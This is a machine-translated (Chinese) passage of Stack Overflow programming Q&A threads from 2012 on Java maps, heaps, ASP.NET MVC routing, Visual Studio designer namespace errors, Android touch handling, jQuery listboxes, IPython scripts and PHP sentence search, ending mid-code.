Map 接口声明的`Map.entrySet()`方法返回地图的集合视图（返回 a `Set`）。这些集合元素中的每一个都是一个`Map.Entry`对象。获取对映射条目的引用的*唯一*方法是从此集合视图的迭代器。

如果要返回`Set`插入到地图中的 a，则必须在放置它的 Collection 上调用它：

`PropertyMap.entrySet()`并将`conceptMap.entrySet()`返回集合。

`Map.entrySet()`没有在您实例化的任何一个上调用该方法`Maps`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-28T10:10:21.297

Map.entrySet() 返回地图的集合视图。将其更改为 conceptMap.entrySet() 或 propertyMap.entrySet

# java - 我不记得固定大小的排序树的数据结构

> ID：11782724
> 
> 赞同：0
> 
> 时间：2012-08-02T17:28:59.983
> 
> 标签：java, data-structures, computer-science

假设我想从任意数量的记录中找到最低的 10 个值。当我遍历记录时，我将它们添加到结构中，直到它达到我的最大大小 10。之后，每次我添加一个不高于列表中最高记录的记录时，当前最高删除保留最大记录数。

或者更简单地说，我如何处理一个（可能非常大的）对象列表，并且只以内存有效的方式保留特定数量的对象？

我似乎记得有某种数据结构可以做到这一点，但显然我在谷歌搜索方面做得很差。我假设它的任何结构都会在某个地方有一个 java 实现。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T20:12:10.533

如果您愿意将所有 N 个值保留在内存中，则可以使用二进制最小堆来堆化数组。

它的构造需要 O(n) 的摊销时间，最少 10 个元素需要 O(10*log(10))，即 O(1)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:43:16.133

一个简单的方法是实现一个[最大堆](http://en.wikipedia.org/wiki/Heap_%28data_structure%29)（例如[二进制堆](http://en.wikipedia.org/wiki/Binary_heap)）并执行以下操作（伪代码啊！）：

```
List elms; // original elements
Heap heap; // heap we store in

for element e in elms:
    push e onto heap
    if heap contains more than 10 elements:
        pop the max element from heap 
```

在此之后，`heap`将包含 10 个最小的元素。

假设一个二进制堆，tihs 需要`O(k)`额外的空间和`O(n lg k)`时间，`k`你想要的元素数量在哪里。

# asp.net-mvc-3 - 在 MVC3 中路由文档相关的静态 url

> ID：11782725
> 
> 赞同：1
> 
> 时间：2012-08-02T17:29:01.747
> 
> 标签：asp.net-mvc-3, routes

我正在将 JavaScript 库集成到 ASP.NET MVC3 Web 应用程序中。该库假定它将安装在引用它的页面旁边，因此它使用文档相对 URL 来查找其组件。

例如，默认目录布局看起来像

```
container-page.html
jslibrary/
    library.js
    images/
        icon.png
    extensions/
        extension.js
        extension-icon.png 
```

但是，我想从`/Home/edit`. 我默认安装库`Scripts\jslibrary\` 当我在视图中引用库时`Views\Home\edit.cshtml`，库的文档相关链接如

```
images/icon.png 
```

最终要求

```
http://localhost/Home/images/icon.png 
```

这会导致找不到文件 (404) 错误。如何构建要查找的路线

```
{anyControllerName}/images/{anyRemainingPathInfo} 
```

并提供服务

```
http://localhost/Scripts/jslibrary/images/{anyRemainingPathInfo} 
```

?

（全面披露：我仍在生产中使用 IIS 6，并且很快就没有太多机会进入 IIS7，所以如果在 IIS 级别上做得更好，请考虑 IIS6。谢谢！）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T21:11:06.547

您可以创建一个控制器来处理您的重定向逻辑 - 例如“图像”控制器。在 Global.asax 文件中注册一个全局路由，使用模式（更多关于这种类型的模式[在这里](http://www.adventuretechgroup.com/2011/02/making-a-useful-mvc3-global-action-filter/)：

```
routes.MapRoute(

    "Images", // Route name

     "{xyz}/{controller}/{path}", // URL with parameters

     new {controller = "Images", action = "Index", path= UrlParameter.Optional} // Parameter defaults); 
```

**在您的控制器中：**

```
public ActionResult Index(string path)
{
    //format path, parse request segments, or do other work needed to Id file to return... 

    return base.File(path, "image/jpeg"); //once you have the path pointing to the right place...
} 
```

不确定这个解决方案是否适合你，希望我能想出更优雅的东西。祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:24:26.997

除了重写库并让它检查适当的目录之外，我能想到的唯一解决方案是将视图、库和支持文件包含在库可以访问的目录结构中。这当然会打破 MVC 对查找视图的配置方式的约定，因此您必须编写自定义覆盖 Razor 查找视图的方式，这不太复杂，但您可能会让自己的生活变得更加困难道路取决于您的应用程序。你的电话是两个邪恶中较小的一个:)（我会去修图书馆）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-02T09:39:46.673

做一个帮助功能

```
@functions{

        public string AbsoluteUrl(string relativeContentPath)
        {
            Uri contextUri = HttpContext.Current.Request.Url;

            var baseUri = string.Format("{0}://{1}{2}", contextUri.Scheme,
               contextUri.Host, contextUri.Port == 80 ? string.Empty : ":" + contextUri.Port);

            return string.Format("{0}{1}", baseUri, VirtualPathUtility.ToAbsolute(relativeContentPath));
        }
    } 
```

打电话

```
@AbsoluteUrl("~/Images/myImage.jpg") <!-- gives the full path like: http://localhost:54334/Images/myImage.jpg --> 
```

这个例子来自 [https://dejanvasic.wordpress.com/2013/03/26/generating-full-content-url-in-mvc/](https://dejanvasic.wordpress.com/2013/03/26/generating-full-content-url-in-mvc/)

# c# - Visual Studio 2010 设计器生成无效代码

> ID：11782732
> 
> 赞同：3
> 
> 时间：2012-08-02T17:29:16.957
> 
> 标签：c#, winforms, datagridview, designer

这对我来说是第一次，我以为我完全失去了理智。我有一个简单的 winform 应用程序，我在其中添加了一个 datagridview。我为 dgv 设置数据源，使用我在其他六个项目中使用过的相同源，并按照我想要的方式配置网格。此时表单上除了网格之外没有其他任何内容，并且项目现在包含一个数据集、一个绑定源和一个表适配器。伟大的。但是，设计者在这样做时生成的代码无效并导致编译错误，告诉我数据集表适配器对象和数据集本身不存在。

如果我进入编译错误所在的设计器，我会看到以下几行：

```
this.tILEDataSet = new ImageEdit.TILEDataSet();
this.logosTableAdapter = new ImageEdit.TILEDataSetTableAdapters.LogosTableAdapter(); 
```

ImageEdit 是我添加了这个绑定控件的类。如果我删除“ImageEdit。”，代码编译并完美运行。当然，由于这是一个设计器生成的文件，一旦我进行任何其他更改，它就会恢复到有问题的代码。

我做了三次，三个不同的项目，两次从头开始用一个新的视觉工作室实例。

导致这种情况发生的原因可能是什么，除了手动编辑设计器文件之外，是否有解决方法，而我从来不喜欢这样做？

我没有改变任何东西，一切都是由设计师生成的。命名空间和类都被创建为 ImageEdit。设计器包含以下定义： private TILEDataSet tILEDataSet；私有 TILEDataSetTableAdapters.LogosTableAdapter logosTableAdapter;

设计器类定义确实派生自 global::System.ComponentModel.Component：

```
public partial class LogosTableAdapter : global::System.ComponentModel.Component {
    .
.
. 
```

再次感谢您的任何见解。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T22:50:06.560

我怀疑您的解决方案中有几个名为 的成员`ImageEdit`，无论它们是命名空间、类还是其他成员。在 Microsoft's [Guidelines for Names](http://msdn.microsoft.com/en-us/library/ms229002.aspx)中，特别是[Names of Names](http://msdn.microsoft.com/en-us/library/ms229026.aspx)他们推荐：

> **使用公司名称为命名空间名称添加前缀，以防止来自不同公司的命名空间具有相同的名称和前缀。**
> 
> **不要对命名空间和该命名空间中的类型使用相同的名称。例如，不要将 Debug 用作命名空间名称，并在同一命名空间中提供一个名为 Debug 的类。一些编译器要求这些类型是完全限定的。**
> 
> **不要为单个应用程序模型中命名空间中的类型赋予相同的名称。**
> 例如，如果您正在编写一个供 Windows 窗体应用程序开发人员使用的特殊控件库，则不应引入名为 Checkbox 的类型，因为应用程序模型 (CheckBox) 已经存在具有此名称的类型。

仅第二点就可以解决您的问题。使用第一点，将公司名称作为命名空间的一部分，将导致代码生成器为您的对象提供更简洁的名称，例如：

```
this.tILEDataSet = new MyCompany.ImageEdit.TILEDataSet();
this.logosTableAdapter = new MyCompany.ImageEdit.TILEDataSetTableAdapters.LogosTableAdapter(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-20T21:16:45.403

如果在任何请求命名空间的配置中键入与项目相同的名称或命名空间，这也可能发生：

[![在此处输入图像描述](../Images/27864c2c37ddf1ba9a05830f168c5773.png)](https://i.stack.imgur.com/N0MA2.png)

这会导致与您现有的命名空间发生冲突：

[![在此处输入图像描述](../Images/c599a5dcee7a3eea8197170c6ab7eaa8.png)](https://i.stack.imgur.com/SzNBU.png)

只需使用代码中已有的命名空间以外的任何其他名称。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-06T15:16:31.930

我知道这是一个旧线程，但是当我遇到同样的问题时遇到了它。我认为我生成的代码导致问题的原因是因为我在保存新表单之前创建了表单并添加了 datagridview 并链接到数据源。如果我创建了表单，保存了它，添加了 DataGridView，保存了表单，然后链接了数据源并保存了它，我不再遇到问题。可能与代码生成器无法看到未保存的代码有关。

# haskell - 卷曲的单子变压器？

> ID：11782734
> 
> 赞同：4
> 
> 时间：2012-08-02T17:29:29.797
> 
> 标签：haskell, curl, functional-programming, monads

我正在寻找一个 monad 转换器，我可以用它来制作 HTTP（等）类型的请求/响应。目的类似于 cURL 命令行工具。[编辑]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:22:24.023

嗯，有[curl](http://hackage.haskell.org/packages/archive/curl/latest/doc/html/Network-Curl.html)包，它使用`IO`monad。

# php - 使用php将视频录制为现场直播

> ID：11782735
> 
> 赞同：0
> 
> 时间：2012-08-02T17:29:30.093
> 
> 标签：php, live-streaming, broadcasting

我需要广播意味着每个人都会在视频播放时观看视频，而不是在他们访问网页后在视频开头观看。

我看到了一些类似这样的嵌入视频的代码，

```
<object width="425px" height="360px" >
    <param name="allowFullScreen" value="true"/>
    <param name="wmode" value="transparent"/>
    <param name="movie" value="http://mediaservices.myspace.com/services/media/embed.aspx/m=5385825,t=1,mt=video,searchID=,primarycolor=,secondarycolor="/>
    <embed src="http://mediaservices.myspace.com/services/media/embed.aspx/m=5385825,t=1,mt=video,searchID=,primarycolor=,secondarycolor=" width="425" height="360" allowFullScreen="true" type="application/x-shockwave-flash" wmode="transparent"/>
</object> 
```

我需要知道是否可以使用 PHP，在 Web 中搜索多次，但还没有找到合适的解决方案。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-02T17:31:52.233

这与客户端代码无关。您应该在视频托管平台中配置单个流。这就是解决挑战的地方，而不是客户端代码。

更加具体：

> 我需要广播

据我从某些服务器上看到的，我没有看到任何关于客户端凸轮的信息。

> 表示每个人都会在播放视频时观看视频

所以它是发送给页面所有访问者的流，而不是像电视广播那样的个人聊天流。

> ，而不是在他们访问网页后的视频开头。

因此，您可以集中启动它，然后就可以加入。因此，如果流在 35 分钟时开始观看，您就会错过它。就像电视一样。

如果这一切都正确，那么您应该在服务器上进行配置。因此，不要为每个观众单独流式传输，而只需使用通用流式传输。

# android - android: Activity 使用 OnTouchListener() 启动 2 次

> ID：11782742
> 
> 赞同：2
> 
> 时间：2012-08-02T17:29:50.150
> 
> 标签：android

我有一个用于长按下状态按钮的动作类。它真的很好用！

但是有人知道为什么在这个代码块中我的活动开始了 2 次吗？当我按下后退按钮时，我必须这样做 2 次。

感谢您的帮助！

* * *

**这是我的java代码：**

```
 Button MenuBtnStart;  

   final Handler handlerBtnStart = new Handler();

          MenuBtnStart.setOnTouchListener(new OnTouchListener() {
          public boolean onTouch(final View v, MotionEvent event) {

          MenuBtnStart.setBackgroundDrawable(getResources().getDrawable(R.drawable.hover));

                 v.setPressed(true);

                 handlerBtnStart.postDelayed(new Runnable() {

                           public void run() {

                            Intent myIntent = new Intent(TextActivity.this, NextActivity.class);
                            TextActivity.this.startActivity(myIntent);

                        v.setPressed(false);

                    }

                }, 900);  // end of Handler new Runnable()

                 return true;
          } 

 });  // end of OnTouchListener() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:34:02.550

[`DOWN`](http://developer.android.com/reference/android/view/MotionEvent.html#ACTION_DOWN)仅当操作为;时才应激活它。在此之后可能会有一个[`MOVE`](http://developer.android.com/reference/android/view/MotionEvent.html#ACTION_MOVE)or[`UP`](http://developer.android.com/reference/android/view/MotionEvent.html#ACTION_UP)动作，这将再次激活它。

```
final Handler handlerBtnStart = new Handler();

MenuBtnStart.setOnTouchListener(new OnTouchListener() {

    public boolean onTouch(final View v, MotionEvent event) {
        int action = event.getAction() & MotionEvent.ACTION_MASK;

        if (action == MotionEvent.ACTION_DOWN) { 
            MenuBtnStart.setBackgroundDrawable(getResources().getDrawable(R.drawable.hover));

            v.setPressed(true);

            handlerBtnStart.postDelayed(new Runnable() {

                public void run() {

                    Intent myIntent = new Intent(ThisActivity.this, NextActivity.class);
                    ThisActivity.this.startActivity(myIntent);

                    v.setPressed(false);

                }

            }, 900);  // end of Handler new Runnable()

            return true;
        }

        return false;
    }

});  // end of OnTouchListener() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:33:22.040

`onKeyUp()`我认为它在两者上都被调用`onKeyDown()`- 这些是你应该覆盖的方法，而不是`onTouch()`.

**编辑：**

我没有仔细阅读 - 你在长时间点击之后，我一开始没有得到它。我曾经收到类似问题的一个很好的答案。看一下：[如何在长按时访问菜单按钮](https://stackoverflow.com/questions/10867033/how-to-access-menu-button-onlongclick-in-android)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T18:03:14.530

您应该处理 ACTION_DOWN 事件。

```
if (event.getAction() == MotionEvent.ACTION_DOWN){

// Do Something
}
return true; 
```

# jquery - MVC 3 在多个列表框中，如何使用 jquery 传输列表框项目

> ID：11782743
> 
> 赞同：0
> 
> 时间：2012-08-02T17:29:53.843
> 
> 标签：jquery, asp.net-mvc-3

我有（n）个列表框。我有一个执行函数的按钮，在该函数中，我试图获取第一个列表框的选定项目以及在第一个列表框中选择的任何索引/项目，我将在剩余的列表框中选择相同的选项。所有列表框都有完全相同的列表项。

列表框：

```
@Html.ListBoxFor(model => model.ServiceTypes, new MultiSelectList(RunLog.Domain.Lists.GlobalList.PartsServiceTypes(), "ID", "Name"), new { style = "width: 200px; height: 80px;", id = "lstbox_@(model.PartID)" }) 
```

按钮：

```
@*<input id="button" type="button" class="art" onclick="dosomething()" name="broadcast" value="+" />*@ 
```

JS功能：

```
function dosomething() {

    //The following line returns all the listboxes
    var listBoxes =  var listBoxes = $('select[multiple]');

    //In the following line I am trying to access the items from the first listbox but not sure how to access it, would it be by index. it does not work
    var x = $('listBoxes[1] option:selected')

    //In the following loop I would iterate through the selected items from the first listbox and select them in the rest of the listboxes
    for (var i = 0; i < listBoxes.length; i++) {
        var element = listBoxes[i];

//      if (element.multiple) {
//          alert("im a multilistbox");
//      }

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T19:05:57.547

尝试这样的事情：

```
@{
var list = new List<string>();
list.Add("one");
list.Add("two");
list.Add("three");
}

@Html.ListBox("listbox", new SelectList(list), new { id = "listbox", multiple = "multiple" })

<input type="button" value="Click me!" onclick="GetSelected()" />

<script type="text/javascript">
    function GetSelected() {
        var listboxitems = document.getElementById("listbox");

        for (var i = 0; i < listboxitems.length; i++) {
            if (listboxitems[i].selected) {
                alert(listboxitems[i].textContent);
            }
        }
    }
</script> 
```

您可以像这样保存列表项的文本内容，显然：

```
var element = listboxitems[i].textContent; 
```

**更新：**
针对您的评论，请尝试以下示例：

```
@{
    var list = new List<string>();
    list.Add("one");
    list.Add("two");
    list.Add("three");

    int i;

    for(i = 0; i < 5; i++)
    {
        @Html.ListBox("listbox"+i, new SelectList(list), new { id = "listbox" + i, multiple = "multiple" })
    }
}

<input type="button" value="Click me!" onclick="GetSelected()" />

<script type="text/javascript">
function GetSelected() {
    var index = @i;

    var firstListBoxItems = document.getElementById("listbox0");

    for (n = 1; n < index; n++) {
        var currentListBoxItems = document.getElementById("listbox"+n);

        for (var i = 0; i < firstListBoxItems.length; i++) {
            if (firstListBoxItems[i].selected) {
                currentListBoxItems[i].value = "NewValue"+i;
            }
        }
    }
}
</script> 
```

如果您再次获取一些随机列表，则可以使用调试器检查并查看值已更改。

我自己还是网络编程新手，所以这可能看起来很难看，但它应该让您了解如何完成您的任务。

# python - 我可以执行 ipython 脚本吗？

> ID：11782744
> 
> 赞同：9
> 
> 时间：2012-08-02T17:29:59.380
> 
> 标签：python, ipython

有没有办法执行 ipython 脚本？我不是指 python 脚本，而是使用简化的语法，因为它将被输入到 ipython shell

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-02T18:26:52.527

当然，只需使用 IPython 运行它们，就像使用 Python 运行纯 Python 脚本一样：

```
$> echo '%time print "hello, world"' > script.ipy
$> ipython script.ipy
hello, world
CPU times: user 0.00 s, sys: 0.00 s, total: 0.00 s
Wall time: 0.00 s 
```

# jquery - 计算另一个选择的子集中的 td 的长度

> ID：11782745
> 
> 赞同：0
> 
> 时间：2012-08-02T17:30:03.687
> 
> 标签：jquery, html-table

我目前正在为我正在做的一个项目感到困惑。使用 jQuery，我试图计算打开行中每个 div 对象的长度（td 数）。我有一个链接到我的演示。

[http://staging.mc.vanderbilt.edu/criss/ui-projects/r4u/073112/lab.html](http://staging.mc.vanderbilt.edu/criss/ui-projects/r4u/073112/lab.html)

单击“患者姓名”会打开该行，每个“药丸”都会展开以显示数据。一些“pils”（.results）有多个数据条目。我的 jQuery 选择应该计算每个 .results 中的 tds，然后根据是否有 2 个或 3 个或更多“.ear”出现以允许扩展。我不希望耳朵显示 tr.dates 行中是否只有 2 个 tds。

如果您在打开行之前单击“药丸”，我可以使用此功能。尝试在患者一号行中的“SPEP”。

我对 Jquery 比较陌生，所以不擅长编写复杂的函数或选择。任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:41:27.273

要计算 tr.dates 中的 tds 数，您可以使用以下内容

`$(this).find('tr.dates td').length`

假设 $(this) 将是当前的“.results” div。

因此，根据您的要求，如果上述代码等于 <= 2，则不显示“.ear”。

一些更多的代码来显示工作的东西

```
//Clicked on some button in tr with the class 'pt_row'
$('.pt_row td .name, .info_row td .name').click(function() {
   //Get closest pt_row and iterate through results section in this pt_row.
   $(this).closest('.pt_row').find('.results').each(function() {
      //Count number of tds in the dates
      if ( $(this).find('tr.dates td').length <= 2 ) {
         //We have 2 or less tds. So, don't show ear
         $(this).find('.ear').hide();
      } else {
         //We have more than 2 tds. So, show ear
         $(this).find('.ear').show();
      }
   });
}); 
```

# c# - ASP.Net MVC 为带有操作参数的 URL 返回 404，但不为默认路由返回

> ID：11782749
> 
> 赞同：1
> 
> 时间：2012-08-02T17:30:22.427
> 
> 标签：c#, asp.net, asp.net-mvc, asp.net-mvc-2

我正在使用添加了一些 MVC 组件的 WebForms 应用程序。我的想法是将越来越多的应用程序移到 MVC 上，但它不可能一次全部转换。由于各种原因，我无法控制它必须使用 ASP.Net 2.0 和 MVC 2.0，因为它们是内置的。我还必须支持 IIS 6 和 IIS 7。

首先，我很清楚无扩展路由的问题，并且我*没有*尝试使用它，因此通配符映射等没有问题。我首先尝试使用我的路由 ala "{controller}.aspx/{action}/ {id}”，但在将头撞到墙上后，我切换到“{controller}.mvc/{action}/{id}”，但遇到了同样的问题。

其次，即使在我的开发机器上的 IIS 7 集成模式下，我也无法让它工作，更不用说经典模式或 IIS 6。它在 Cassini 下都可以正常运行，但是一旦我部署到 IIS 7，MVC 组件就会中断。由于这是在我的开发机器上，我知道 ASP.Net 已正确注册到 IIS，并且我可以在控制面板中看到所有继承的 HTTP 处理程序（例如：ASPX 映射到 PageHandlerFactory）。

**症状**：
所有 ASPX WebForms 请求都能正常工作。
一个 MVC 请求*只*对控制器没有指定动作/id 被路由到 MVC 并正确执行。
*对带有 action 或 id 的 MVC 路由的任何请求都会立即返回 404*。就好像 IIS 认为“.mvc”扩展名是文件夹路径的一部分，所以它忽略 HTTP 处理程序并返回 404。

换句话说：
/app/WebForm.aspx - *HTTP 200 OK，执行 WebForm.aspx.cs 代码隐藏*
/app/Fancy.mvc - *HTTP 200 OK，执行 /Controllers/FancyController.cs，索引方法*
/app/Fancy。 mvc/DoThingy - *HTTP 404 NOT FOUND，即使 FancyController 有 DoThingy 方法*

**糟糕的解决方案**：我尝试过设置 runAllManagedModulesForAllRequests 之类的方法，但这不仅对性能不利，而且还破坏了我的 Web 表单。即使我将其设置为忽略所有带有 .ASPX 的路由，它们仍然会中断。

我不能使用通配符映射，所以没有帮助。

**其他详细信息**：我在 web.config/system.WebServer 中设置了我的 HTTP 处理程序。它是列出的第一个处理程序。

```
<add name="MvcRoutingHandler" preCondition="integratedMode" verb="*" path="*.mvc" type="System.Web.Routing.UrlRoutingHandler, System.Web.Routing, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" resourceType="Unspecified" /> 
```

我指定什么处理程序或什么选项似乎并不重要 - IIS 似乎没有检查任何这种配置（再次因为它似乎认为路径的 Fancy.mvc 部分是目录名称，不t 找到该目录，然后保释）。

我的路线：

```
 routes.IgnoreRoute("{resource}.axd/{*pathInfo}");
        routes.IgnoreRoute("{resource}.aspx/{*pathInfo}");
        routes.IgnoreRoute("{resource}.asmx/{*pathInfo}");
        routes.IgnoreRoute("{resource}.aspq/{*pathInfo}");
        routes.IgnoreRoute("{resource}.svc/{*pathInfo}");

        routes.MapRoute("Default",
               "{controller}.mvc/{action}/{id}",
               new { action = "Index", id = UrlParameter.Optional }
               ); 
```

**更新：**我尝试使用 IIS 7 经典模式；然后我在 IIS 管理器中添加了一个 .mvc 映射，指向 asp_net ISAPI dll 并得到了相同的结果

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:01:25.480

好的，只是为了让其他人看起来不傻，事实证明这是 URL 的问题...... URL 被发送到站点的根目录，而不是应用程序目录。我应该首先检查一下。我不认为这是问题所在，因为当我在地址栏中手动输入 URL 时，它在 Index 上工作，但操作方法需要 HttpPost，因此是脚本和手动输入的地址吐出的综合因素相同的错误信息。

对于其他混合 WebForms 和 MVC 的人，请仔细检查您的 URL 是否正确。这是我*现在*在 WebForms 母版页上使用的一些代码，这样我的客户端 JS 就可以知道在哪里路由 MVC 请求：

```
string baseUrl =  Request.Url.GetLeftPart(UriPartial.Authority);
if (baseUrl.EndsWith("/")) baseUrl = baseUrl.Substring(0, baseUrl.Length - 1);
baseUrl = baseUrl + ResolveUrl("~/");
Page.ClientScript.RegisterHiddenField("BaseUrl", baseUrl); 
```

# php - PHP - 搜索搜索词的句子数组？

> ID：11782751
> 
> 赞同：2
> 
> 时间：2012-08-02T17:30:39.843
> 
> 标签：php, arrays, search, levenshtein-distance

所以，假设我有一个简单的句子数组。根据用户输入搜索它并返回最接近的匹配项的最佳方法是什么？

Levenshtein 功能似乎很有希望，但我不认为我想使用它们。用户输入可能很简单`highest mountain`，在这种情况下，我想在数组中搜索具有`highest mountain`. 如果该确切的短语不存在，那么我想搜索具有`highest`AND`mountain`但不是背靠背的句子，依此类推。Levenshtein 函数在每个字符的基础上工作，但我真正需要的是每个单词的基础。

当然，在某种程度上，Levenshtein 函数可能仍然有用，因为我还想考虑句子包含短语`highest mountains`（注意 S）或类似内容的可能性。

你有什么建议？是否有任何已经存在的 PHP 系统可以做到这一点？单独的 Levenshtein 函数会是一个适当的解决方案吗？是否有我不知道的基于单词的 Levenshtein 函数？

谢谢！

**编辑**- 我已经考虑了 MySQL 全文搜索，并且还考虑了将 A) 输入和 B) 每个句子分成单独的单词数组的可能性，然后使用 Levenshtein 函数来解释单词的变化。（颜色，颜色，颜色等）但是，我担心这种方法虽然可能很聪明，但在计算上可能会很繁重。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:36:57.757

由于我不喜欢为您编写代码，因此我通常会先问您尝试过什么。但是，我目前遇到了一些问题，所以休息一下来写这个：

```
$results=array();
foreach($array as $sentence){
    if(stripos($sentence,$searchterm)!==false)
        $results[]=$sentence;
}
if(count($results)==0){
    $wordlist=explode(" ",$searchterm);
    foreach($wordlist as $word){
        foreach($array as $sentence){
            if(stripos($sentence,$word)!==false)
                $results[]=$sentence;
        }
    }
}
print_r($results); 
```

这将准确搜索一系列句子的术语。如果您输入“microsift”并且句子中包含“Microsoft”一词，它将找不到结果。它不区分大小写，因此它应该更好地工作。如果使用完整术语没有找到结果，则将其分解并按单词搜索。希望这至少为您指明了一个起点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:36:51.193

PHP 没有内置函数来执行此操作。这是因为您所要求的内容涉及搜索相关性、相关术语、迭代搜索以及需要在搜索中模仿人类逻辑的许多更复杂的操作。您可以尝试寻找基于 PHP 的搜索类，尽管我知道的是数据库搜索引擎而不是数组搜索类。自己制作是非常复杂的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:46:04.060

检查这个： http: [//framework.zend.com/manual/en/zend.search.lucene.overview.html](http://framework.zend.com/manual/en/zend.search.lucene.overview.html)

> Zend_Search_Lucene 提供了一个 HTML 解析特性。可以直接从 HTML 文件或字符串创建文档：

```
$doc = Zend_Search_Lucene_Document_Html::loadHTML($htmlString);
$index->addDocument($doc); 
```

# java - AjaxEditableLabel 显示由 SimpleDateFormat 格式化的日期

> ID：11782762
> 
> 赞同：0
> 
> 时间：2012-08-02T17:31:33.523
> 
> 标签：java, wicket

我有和 AjaxEditableLabel 显示来自 Date 对象的日期，但是当它以它的格式显示时，就像这个“08-08-07 00:00”一样。有什么我可以添加到标签上的东西，所以它以不同的方式呈现它的对象吗？

```
item.add(new AjaxEditableLabel("stockEntry_date")
{
@Override
public void onSubmit(AjaxRequestTarget target) {
    super.onEdit(target);
    //Save to database
    }
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T14:55:22.167

您可以使用 Java 中的 DateFormat 类以所需格式获取日期的字符串表示形式。您可以使用 DateFormat 将 Date 转换为 String 以用于显示目的，然后将其转换回 Date 以执行您想要使用的操作（例如保存到数据库）

它可能看起来像这样（请注意，我没有使用任何 IDE 编写此代码，因此可能不正确）

```
DateFormat df = DateFormat.getDateInstance(desiredFormat);
myString = DateFormat.getDateInstance().format(myDate);

item.add(new AjaxEditableLabel("stockEntry_date", myString)
{
@Override
public void onSubmit(AjaxRequestTarget target) {
    super.onEdit(target);
    df.parse(this.getLabel().getDefaultModelObject());//not sur if this is the correct to get the label value
    //Save to database
    }
}); 
```

# android - 如何从一组视图中选择一个特定视图？

> ID：11782763
> 
> 赞同：2
> 
> 时间：2012-08-02T17:31:35.663
> 
> 标签：android, ontouchlistener, onlongclicklistener, custom-view

对于我需要开发的应用程序，我需要能够`select one view`从`ViewGroup`用户`long press`必须`view`弹出一个警报对话框开始，从中我将根据要求选择选项，这些选项是删除视图和更改该特定视图的背景颜色。我正在创建不同的自定义视图（自定义视图从视图扩展）并且它具有 Touchlistener。将这些视图动态附加到布局（RelativeLayout）。让我们假设我的布局有 3 个视图。

**我的问题：**

*   我想从布局上的可用视图列表中选择一个视图。
*   如何限制自定义视图大小而不是占用整个父视图。

**我面临这样的问题：**如果我为自定义视图设置背景颜色，请查看此图像，实际上我设置为布局背景颜色白色，此处自定义视图占据全屏。所以，无法看到父背景颜色。这里自定义视图大小的问题，无法限制自定义视图大小而不是占用整个父视图。即使我在自定义视图之外触摸，自定义视图的触摸侦听器也会触发。我只想将那些触摸监听器限制在我的自定义视图中。

![在此处输入图像描述](../Images/4285b3156f283dac958217e0e125de0b.png).

**主要要求：** 最后我想像下图这样实现，现在我可以向布局添加更多自定义视图，但无法删除选定的视图。当我长按布局中的任何一个视图时，它应该弹出一个带有两个按钮的警报对话框，如果我选择一个选定的视图应该删除另一个选择背景颜色更改。

![在此处输入图像描述](../Images/26eb64fa65d48d8266a1b807d7446e60.png)

**RelaventCode：**我正在向这样的布局添加视图。

```
findViewById(R.id.line).setOnClickListener(new OnClickListener() {
    @Override
    public void onClick(View v) {
        CustomView drawView = new CustomView(context);
        frame.addView(drawView);
   }
}); 
```

这是自定义视图：

```
public class CustomView extends View {

public CustomView (Context context) {
    super(context);
    init();
}
private void init() {

    Paint paint = new Paint();
    Paint pai = new Paint();         
    Path path = new Path();
    paint.setColor(Color.RED);
    paint.setStyle(Paint.Style.STROKE);
    paint.setStrokeWidth(5);
    path.lineTo(50, 100);       
}

@Override
public void onDraw(Canvas canvas) {
    path.setFillType(Path.FillType.EVEN_ODD);
    path.moveTo(Top_Point.x, Top_Point.y);
    path.lineTo(Right_Point.x, Right_Point.y);
    path.lineTo(Left_Point.x, Left_Point.y);
    path.lineTo(Top_Point.x, Top_Point.y);
    path.close();
    canvas.drawPath(path, Inner_Paint);
    canvas.drawLine(Top_Point.x, Top_Point.y, Right_Point.x, Right_Point.y,
            Lines_Paint);
    canvas.drawLine(Right_Point.x, Right_Point.y, Left_Point.x,
            Left_Point.y, Lines_Paint);
    canvas.drawLine(Left_Point.x, Left_Point.y, Top_Point.x, Top_Point.y,
            Lines_Paint);
}
@Override
public boolean onTouchEvent(MotionEvent event) {     
    switch (event.getAction()) {
    case MotionEvent.ACTION_DOWN:
        PointF NewP = new PointF(0, 0);
        NewP.x = event.getX();
        NewP.y = event.getY();
        if (TopTouchArea.contains(event.getX(), event.getY())) {
            currentTouch = TOUCH_TOP;
        } else if (RightTouchArea.contains(event.getX(), event.getY())) {
            currentTouch = TOUCH_RIGHT;
        } else if (LeftTouchArea.contains(event.getX(), event.getY())) {
            currentTouch = TOUCH_LEFT;
        } else if (a) {
            Translate_Point.x = event.getX();
            Translate_Point.y = event.getY();
            currentTouch = Inner_Touch;
            return true; // Return false if user touches none of the
                            // corners
        } else {
            return false;
        }

        return true; 
    case MotionEvent.ACTION_MOVE:
        switch (currentTouch) {
        case TOUCH_TOP:
               /*  ------ */
        case TOUCH_RIGHT:
               /*   ----- */
            invalidate();
            return true;
        case TOUCH_LEFT:
         /* ------ */
            invalidate();
            return true;
        case Inner_Touch:
            /* ------ */
            invalidate();
            return true;
        }           
